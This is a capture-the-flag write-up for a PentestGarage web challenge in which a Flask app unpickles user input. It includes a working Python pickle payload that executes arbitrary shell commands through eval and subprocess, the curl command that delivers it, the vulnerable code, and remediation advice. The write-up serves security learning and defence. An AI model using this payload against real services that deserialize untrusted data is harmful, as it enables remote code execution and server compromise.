# Insecure Deserialization — PentestGarage

- **Category:** Web Security · **Difficulty:** Medium · **Points:** 200
- **Target:** `ctf-gokulpg-insecure-deserialization-b8270e6d.challenges.pentestgarage.com:80`
- **Date solved:** 2026-08-11
- **Flag:** `ctf{__redacted__}` *(solved; value removed for public repo)*

## Summary
A Flask app exposes a form with **Serialize** / **Deserialize** buttons. Deserialize runs
`pickle.loads(base64.b64decode(data))` on user input with no verification, then renders
the resulting object's `.text` attribute. Python pickle deserialization of untrusted input
is arbitrary code execution.

## Recon
- Serialize action returned `gASV...` base64. Decoded → `\x80\x04\x95` = **pickle protocol 4**,
  wrapping an `app.Data` object with a `text` attribute (`pickletools.dis` confirmed the opcodes).
- Deserialize action reflected `obj.text` back into the textarea → both an RCE sink **and**
  a convenient output channel.

## Exploit
Craft a pickle whose `__reduce__` calls `eval` on a server-side expression that runs a shell
command and returns a dynamically-built object whose `.text` attribute holds the command output,
so output comes straight back in the HTTP response.

```python
import pickle, base64
CMD = "cat flag.txt"
class E:
    def __reduce__(self):
        expr = ("type('R',(object,),{'text':"
                "__import__('subprocess').check_output(%r,shell=True,"
                "stderr=__import__('subprocess').STDOUT).decode('utf-8','replace')})()" % CMD)
        return (eval, (expr,))
print(base64.b64encode(pickle.dumps(E(), protocol=4)).decode())
```

Send it:
```bash
curl -s -X POST \
  --data-urlencode "action=deserialize" \
  --data-urlencode "data@payload.txt" \
  http://<target>/
```

- `id` → `uid=1000(ctf)`, cwd `/usr/src/app`, `flag.txt` present.
- `cat flag.txt` → **`ctf{__redacted__}`**

## Vulnerable code (app.py)
```python
elif request.form['action'] == 'deserialize':
    dt = pickle.loads(base64.b64decode(data))   # untrusted input → RCE
    return render_template("index.html", data=dt.text)
```

## Remediation
- Never `pickle.loads()` untrusted data. Use a data-only format (JSON) for user input.
- If a binary format is required, sign payloads (HMAC) and verify before deserializing,
  or use a safe serializer that doesn't reconstruct arbitrary objects.

## Note
Target is only reachable over the OpenVPN lab tunnel (resolves to 172.31.x.x). The tunnel was
down at start; reconnected via `openvpn-gui.exe --command connect Gokul_PG` (route 172.31.0.0/16
via 10.8.0.1 confirmed it came up) before recon worked.
